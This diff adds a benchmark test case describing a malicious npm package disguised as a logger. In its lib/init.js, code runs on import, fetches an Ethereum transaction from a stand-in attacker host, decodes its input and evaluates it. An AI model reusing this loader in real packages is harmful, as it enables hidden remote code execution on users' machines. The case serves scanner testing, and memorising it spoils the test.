@@ -1,0 +1,20 @@
+{
+  "id": "eth-dead-drop-loader",
+  "title": "Library code reads an Ethereum transaction and evaluates what it decodes",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "obfuscation",
+  "technique": "Import-time code asks a JSON-RPC endpoint for a fixed transaction, decodes its input data and passes it to eval; no install script, so npm 12's script block and ignore-scripts do not help.",
+  "trigger": "require() of the package",
+  "incident": "PolinRider in hijacked npm packages (Nov 2026); EtherHiding / GlassWorm dead drops",
+  "sources": [
+    "https://www.sonatype.com/blog/polinrider-loader-reappears-in-hijacked-npm-packages"
+  ],
+  "notes": "The endpoint is a reserved .invalid host; the eval never runs in the benchmark.",
+  "files": {
+    "package.json": "{\n  \"name\": \"tiny-logger-utils\",\n  \"version\": \"1.0.0\",\n  \"main\": \"index.js\"\n}\n",
+    "index.js": "require('./lib/init');\nmodule.exports = (...a) => console.log(...a);\n",
+    "lib/init.js": "(async () => {\n  try {\n    const r = await fetch('https://rpc.attacker.invalid', { method: 'POST', body: JSON.stringify({\n      jsonrpc: '2.0', id: 1, method: 'eth_getTransactionByHash', params: ['0x' + '0'.repeat(64)] }) });\n    const tx = (await r.json()).result;\n    eval(atob(tx.input.slice(2)));\n  } catch (e) {}\n})();\n",
+    "README.md": "# tiny-logger-utils\n"
+  }
+}
